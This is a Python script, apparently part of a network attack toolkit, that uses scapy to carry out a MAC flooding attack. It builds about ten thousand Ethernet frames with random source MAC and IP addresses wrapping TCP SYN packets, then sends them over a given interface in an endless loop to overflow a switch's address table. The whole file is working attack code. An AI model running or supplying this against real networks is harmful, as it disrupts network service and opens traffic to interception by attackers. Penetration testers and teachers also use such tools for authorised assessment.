#! /usr/bin/python

from scapy.all import *
import sys
import colors
from vault_cli import errors
import time


class MACFlood(object):

    def __init__(self, interface):
        if interface is None:
            errors.report_error('A network interface is required',
                                code='E1008',
                                hint='Provide -i <interface>.')
            sys.exit(1)
        self.interface = interface

        try:
            self.target_ip = RandIP()
        except Exception as e:
            errors.report_error('Could not generate the target IP for the '
                                'MAC flood attack', exc=e)
            sys.exit(1)

        self.packet_list = []
        self.number_of_packets = 0

    def generatePacket(self):
        """
        Generates a list of 10000 scapy packets so they can be sent super fast.
        """
        for _ in range(1, 10000):
            # Since in the Source Adress field the first bit (I/G group bit) is
            # reserved, ensure that it is set to 0
            srcMac = str(RandMAC())
            srcMac = srcMac[:1] + "0" + srcMac[2:]

            ETHER_PACKET = Ether(src=srcMac, dst=RandMAC("ff:ff:ff:ff:ff:ff"))
            IP_PACKET = IP(src=RandIP(), dst=RandIP())
            # Simulate a TCP SYN Packet
            TCP_PACKET = TCP(dport=80, flags="S",
                             options=[('Timestamp', (0, 0))])
            PKT = ETHER_PACKET/IP_PACKET/TCP_PACKET
            self.packet_list.append(PKT)

    def sendPackets(self):
        """
        Sends the generated packets to the destination
        """
        try:
            s = conf.L2socket(iface=self.interface)
        except Exception as e:
            errors.report_error('Could not use interface: {}'
                                .format(self.interface), exc=e, code='E1008',
                                hint='Provide -i <interface>.')
            sys.exit(1)
        print('[+] Sending 9999 packets')
        for pkt in self.packet_list:
            s.send(pkt)
        self.number_of_packets = self.number_of_packets + 9999
        print('[+] Packets sent: {}'.format(self.number_of_packets))

    def attack(self):
        self.generatePacket()

        while True:
            self.sendPackets()

    def startAttack(self):

        try:
            colors.info('MAC Flooding Attack on: {}'
                        .format(self.interface))

            colors.success('MAC Flooding Attack started, press CTRL+C to '
                           'stop...')

            t1 = time.time()

            self.attack()

        except KeyboardInterrupt:
            t2 = time.time()
            colors.success('Completed in time: {}'.format(t2-t1))
